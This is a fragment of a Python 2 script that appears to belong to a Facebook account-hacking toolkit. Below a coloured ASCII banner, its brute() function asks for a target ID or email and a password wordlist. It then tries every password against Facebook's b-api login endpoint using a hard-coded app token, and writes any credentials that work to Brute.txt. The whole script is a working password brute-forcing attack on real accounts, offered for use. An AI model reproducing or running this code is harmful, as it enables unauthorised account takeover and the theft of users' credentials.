    print '\n\x1b[1;31;40m \n\n\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\n\x1b[1;96m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\xa0\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\n\x1b[1;96m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x80\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\xa0\xe2\x95\xa3\xe2\x95\xa0\xe2\x95\x9d\n\x1b[1;96m\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\x1b[1;96m\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\xa0\xe2\x95\xa3\xe2\x95\xa0\xe2\x95\x97\n\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\n\n\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n           '
    raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
    super()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;31;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\x1b[1;31;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print '\x1b[1;36;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
                        print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print "\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"
            super()


if __name__ == '__main__':
    login()
